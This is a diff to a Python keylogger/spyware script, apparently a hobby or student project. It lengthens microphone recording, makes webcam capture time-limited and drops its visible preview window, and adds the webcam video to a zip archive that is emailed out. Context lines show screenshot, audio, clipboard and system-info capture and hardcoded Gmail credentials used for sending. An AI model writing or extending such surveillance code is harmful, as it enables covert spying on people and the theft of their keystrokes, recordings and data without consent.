@@ -45,7 +45,7 @@ audio_file = r"\audio.wav"
 screenshot_file = r"\screenshot.png"
 video_file = r"\recording.avi"
 
-microphone_time = 5
+microphone_time = 10
 
 email_address = "keyloggerproject4@gmail.com"
 password = "Keylogger12345!"
@@ -181,24 +181,27 @@ def get_video_type(filename):
 
 def webcam():
     res = '720p'
+    capture_duration = 10
+    start_time = time.time()
     cap = cv2.VideoCapture(0)
     out = cv2.VideoWriter(email_folder + video_file, get_video_type(email_folder + video_file), 25, get_dims(cap, res))
 
     if not cap.isOpened():
         raise IOError("Cannot open webcam")
 
-    while True:
+    while int(time.time() - start_time) < capture_duration:
         ret, frame = cap.read()
         out.write(frame)
-        frame = cv2.resize(frame, None, fx=0.5,fy=0.5, interpolation=cv2.INTER_AREA)
-        cv2.imshow('Webcam', frame)
+        # frame = cv2.resize(frame, None, fx=0.5,fy=0.5, interpolation=cv2.INTER_AREA)
         c = cv2.waitKey(1)
-        if c == 27:
+        if c == "q":
             break
-    cap.release()
-    cap.destroyAllWindows()
 
-def zip_folder(filename, filename2, filename3, filename4, filename5):
+    cap.release()
+    out.release()
+    cv2.destroyAllWindows()
+
+def zip_folder(filename, filename2, filename3, filename4, filename5, filename6):
     try:
         zipfile = ZipFile('email.zip', 'w')
         zipfile.write(filename)
@@ -206,6 +209,7 @@ def zip_folder(filename, filename2, filename3, filename4, filename5):
         zipfile.write(filename3)
         zipfile.write(filename4)
         zipfile.write(filename5)
+        zipfile.write(filename6)
         print('zip file created successfully')
     except:
         print("zip file not created")
@@ -216,7 +220,7 @@ screenshot()
 microphone()
 copy_clipboard()
 computer_information()
-zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file, email_folder + audio_file, email_folder + screenshot_file)
+zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file, email_folder + audio_file, email_folder + screenshot_file, email_folder + video_file)
 send_email(log_file, email_folder_zip, to_address)
 
 
